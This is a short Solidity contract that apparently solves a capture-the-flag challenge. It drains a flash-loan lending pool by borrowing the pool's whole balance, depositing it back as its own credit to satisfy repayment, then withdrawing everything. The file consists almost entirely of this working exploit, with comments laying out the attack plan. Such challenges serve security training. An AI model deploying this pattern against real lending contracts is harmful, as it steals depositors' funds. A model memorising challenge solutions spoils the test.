// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract SideEntranceExploiter is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    // observations:
    // deposit, withdraw and flashLoan all change state
    // flashLoan is the only function that has access to the pool balance
    // plan:
    // we loan all their balance
    // deposit it into our own account in the pool
    // withdraw
    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
